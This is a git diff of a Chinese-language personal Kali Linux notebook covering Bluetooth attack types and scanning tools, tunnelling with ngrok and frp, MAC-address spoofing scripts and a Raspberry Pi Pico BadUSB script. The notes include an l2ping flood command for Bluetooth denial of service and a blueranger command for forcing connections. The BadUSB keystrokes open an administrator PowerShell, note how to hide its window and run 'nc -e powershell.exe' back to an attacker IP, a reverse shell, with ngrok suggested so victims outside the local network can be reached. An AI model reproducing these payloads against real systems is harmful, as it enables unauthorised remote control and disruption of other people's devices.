@@ -77,6 +77,12 @@ apt --fix-broken install
 
 # 2. kali必备安装
 
+## 更改语言为中文
+
+* `dpkg-reconfigure locales`
+* 选择`zh_HK.UTF-8`，回车
+* 选择zh_CN.UTF-8
+
 ## 用户增加sudo权限
 
 ```bash
@@ -150,7 +156,7 @@ unison 本机文件夹路径 ssh://用户名@ip:端口//虚拟机文件夹路径
 
 安装g++编译器的命令：
 
-sudo apt-get install build-essential
+`sudo apt-get install build-essential`
 
 执行完后，就完成了gcc,g++,make的安装。build-essential是一整套工具，gcc，libc等等。
 
@@ -410,75 +416,144 @@ https://blog.csdn.net/qq_53079406/article/details/123862255
 
 * 至此，所有形如`XXX@域名`（这里的域名是在CloudFlare申请的域名）的**域名邮箱**收到的邮件，都会被cloudflare的电子邮件路由负责转发到上面填写的**常用邮箱**。
 
+---
+
 # 12. 蓝牙攻击
 
-## 1）Bluetooth DDos Attach
+## （0）蓝牙相关命令
+
+| -命令                                  | -功能                      |
+| -------------------------------------- | -------------------------- |
+| ===============蓝牙适配器============= | ========================== |
+| systemctl status bluetooth.service     | 查看蓝牙服务状态           |
+| systemctl enable bluetooth.service     | 启动蓝牙服务               |
+| bluetoothctl show                      | 查看所有蓝牙设备           |
+| hciconfig -a                           | 查看本地蓝牙设备信息       |
+| hcitool -i hci0 dev                    | 查看本地蓝牙设备           |
+| hciconfig hci0 up                      | 启动本地设备hci0           |
+| lsusb                                  | 查看所有连接的USB设备信息  |
+| =============连接蓝牙设备============= | =========================  |
+| bluetoothctl                           | **进入交互模式**。退出exit |
+| list                                   | List available controllers |
+| paired-devices                         | 查看当前配对设备           |
+| devices                                | 查看范围内的蓝牙设备       |
+| scan on                                | 主动搜索可以连接的蓝牙设备 |
+| remove FC:69:47:7C:9D:A3               | 取消和指定mac设备的配对    |
+| disconnect FC:69:47:7C:9D:A3           | 断开指定mac设备            |
+| block FC:69:47:7C:9D:A3                | 阻止指定mac设备连接到系统  |
+| trust FC:69:47:7C:9D:A3                | 信任指定mac设备            |
+| untrust FC:69:47:7C:9D:A3              | 不信任指定mac设备          |
+| ==============                         |                            |
+| l2ping -i hci0 -s size -f addr         | 同网络协议栈中的ping       |
+|                                        |                            |
+|                                        |                            |
+|                                        |                            |
+|                                        |                            |
+|                                        |                            |
+|                                        |                            |
+
+
+
+## （1）攻击类型
+
+### Bluetooth DDos Attach
 
 在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。
 
 适用于没有rate limiting或implement sophisticated connection management的设备。
 
-## 2）蓝牙模拟攻击
+### 蓝牙模拟攻击
 
 bluetooth impersonation attack
 
 模拟目标设备的已信任的设备。需要知道已信任设备的信息。
 
-## 3）HID Spoofing Attack
+### HID Spoofing Attack
 
 模拟蓝牙键盘，欺骗目标设备以为连接至一个合法设备。可远程控制目标设备，并执行恶意命令。
 
-## 4）蓝牙拦截攻击
+### 蓝牙拦截攻击
 
 bluetooth interception attack
 
-## 5）BlueBorne攻击
+### BlueBorne攻击
 
 不具有广泛适用性，针对操作系统漏洞，但很多设备在旧版本系统上运行。
 
-## 6）工具
+## （2）工具
 
-* spooftooph——列出蓝牙设备，以及获取蓝牙设备名称、蓝牙地址等信息。
-
-  Kali自带
-
-* btscanner——无需配对目标设备，从中提取设备信息
-
-  `sudo apt install btscanner`
-
-* RedFang——发现隐藏蓝牙设备
-
-  ```bash
-  sudo apt install redfang
-  ```
-
-  ![image-20240317223156649](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317223156649.png)
-
-* BlueRanger——获取蓝牙设备范围、位置
-
-* BetterCap
-
-* BTLEJUICE
-
-* BTLEJACK
-
-
-
-## 7）蓝牙DDoS攻击
-
-https://www.mzbky.com/1376.html#:~:text=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Kali%20Linux%E4%BE%A6%E5%90%AC%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87%201%20%E6%AD%A5%E9%AA%A41%20%E4%BD%BF%E7%94%A8hciconfig%E5%90%AF%E7%94%A8%E8%93%9D%E7%89%99%E9%80%82%E9%85%8D%E5%99%A8%20%E5%A6%82%E6%9E%9C%E6%82%A8%E7%86%9F%E6%82%89%E7%94%A8%E4%BA%8EWi-Fi%E5%8D%A1%E5%92%8C%E9%80%82%E9%85%8D%E5%99%A8%E7%9A%84%20ifconfig%20%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%98%E6%9C%89%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%B8%8E%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87%E7%9B%B8%E4%BC%BC%E7%9A%84%E5%B7%A5%E5%85%B7%E3%80%82,%20%20%20%20%20%20HCITOOL%281%29%20
+### 1）hcitool——基本扫描，子功能很多
 
 https://blog.csdn.net/u010764600/article/details/119684001
+
+```bash
+hcitool -i hci0 scan --class #远程扫描设备。若对方隐藏设备，使用fang扫描隐藏设备。#-i指定蓝牙适配器。--class列出设备种类
+hcitool -i hci0 info 88:A9:B7:E6:F1:8F	#查询设备信息
+hcitool -i hci0 inq		#扫描获取远程设备详细信息的命令
+
+hcitool lescan	#扫描小功率设备
+```
+
+### 2）spooftooph
+
+列出蓝牙设备，以及获取蓝牙设备名称、蓝牙地址等信息。
+
+### 3）RedFang——发现隐藏蓝牙设备
+
+通过指定地址范围，遍历扫描。
+
+```bash
+#安装
+sudo apt install redfang
+#help
+fang -h
+#eg.
+fang -r 00803789EE76-00803789EEff -s	#-r指定扫描范围 -s显示设备
+```
+
+![image-20240317223156649](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317223156649.png)
+
+### 4）btscanner——一个有着不错的图形化界面并且带暴破扫描的蓝牙扫描器
+
+该工具会自动使用主机所有的蓝牙接口，并提供进行inquiry扫描和暴力扫描两种方式。一旦扫描到蓝牙设备，用户就可以查看该设备的HCI和SDP信息，如设备类型、厂商、型号等。同时，用户也可以将这些信息进行保存。
+
+```bash
+sudo apt install btscanner
+```
+
+### 5）BlueRanger——强制连接设备
+
+blueranger是Kali Linux预安装的一款蓝牙探测工具。该工具通过向指定设备发送蓝牙L2CAP协议的ping包，创建连接。**由于大部分蓝牙设备对ping包不进行认证，所以可以直接连接成功。**在连接过程中，通过切换Class 1和Class 3模式，来更为精准的确认目标设备距离。	
+
+```bash
+sudo apt install blueranger	#安装
+
+blueranger hci1 20:C9:D0:43:4B:D8	#强连设备
+```
+
+BetterCap
+
+BTLEJUICE
+
+BTLEJACK
+
+bluebugger——针对手机攻击的工具
+
+## 3）DDos
+
+```bash
+l2ping -i hci0 -s 999 -f addr	#设定ping包大小999
+```
 
 https://hackmag.com/security/bluetooth-ddos/
 
 https://blog.csdn.net/qq_42378173/article/details/129013781
 
-## 8）配合msf蓝牙渗透手机
-
-
+## 4）配合msf蓝牙渗透手机步骤
 
 https://www.cnblogs.com/webapplee/p/4060322.html
+
+---
 
 # 13. MetaSploit（msf)
 
@@ -512,6 +587,8 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 
 # 17. ngrok内网穿透
 
+ngrok.com注册不了。替代：ngrok.cc。
+
 通过内网穿透，可以公网ip替代私网ip，使用公网ip访问该服务。
 
 **该程序需一直保持运行，程序关闭，映射也将关闭。**如果需要关闭映射，可以使用ctrl + c 或关闭该界面，进行程序终止。每次重新执行命令，映射外网的域名都会发生改变。如果希望域名不变，可通过开通[ngrok](https://so.csdn.net/so/search?q=ngrok&spm=1001.2101.3001.7020)的会员服务，具体可在官网进行查看。
@@ -520,7 +597,15 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 
 在官网ngrok.org无法注册。
 
-# 18. 树莓派pico制作bad usb
+
+
+# 18. frp内网穿透
+
+需要一个有公网IP的服务器作为中转。
+
+搭建方法看blog。
+
+# 19. 树莓派pico制作bad usb
 
 获取Windows的powershell管理员权限。
 
@@ -532,11 +617,14 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 * 下面脚本的`kaliIP`可以通过ngrok内网穿透成域名。从而让不在局域网内的kali获得权限
 
 ```powershell
+#插入时按住ESC不执行
+CAPSLOCK	#切换到英文
+
 DELAY 200
 GUI r
 
 DELAY 200
-STRING powershell -NoP -NonI #-W hidden可隐藏powershell
+STRING powershell -NoP -NonI #-WindowStyle hidden可隐藏powershell
 CTRL SHIFT ENTER
 
 DELAY 500
@@ -557,7 +645,15 @@ STRING nc -e powershell.exe <kaliIP> 4444<port>
 ENTER
 ```
 
-# 19. MAC地址隐藏
+# 20. 反弹shell
+
+也称为反代shell。
+
+被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
+
+**研究下原理和怎么用Python写。**
+
+# 21. MAC地址隐藏
 
 **macchanger工具**
 
@@ -582,6 +678,45 @@ macchanger -r wlan0
 #重启端口
 ifconfig wlan0 up
 airmon-ng start wlan0
+```
+
+```bash
+# 00-macchangeeth0.sh
+#! /bin/bash
+
+airmon-ng stop eth0
+ifconfig eth0 down
+
+macchanger -r eth0
+
+ifconfig eth0 up
+airmon-ng start eth0
+```
+
+```python
+#! /usr/bin/python3
+
+import subprocess
+import time
+import schedule
+
+def job():
+    subprocess.Popen('ifconfig',shell=True) 
+    print('-------------------------------------------------------------------------------------------')
+    time.sleep(1)
+    subprocess.Popen('./bash_script/00-macchangeeth0.sh',shell=True) 
+    time.sleep(20)
+    print('-------------------------------------------------------------------------------------------')
+    print('eth0 MAC changed..')
+    subprocess.Popen('ifconfig',shell=True) 
+
+schedule.every(60).minutes.do(job)	# 每60min执行job
+
+job()
+while True:
+        # run_pending：运行所有可以运行的任务
+    schedule.run_pending()
+    time.sleep(1)
 ```
 
 
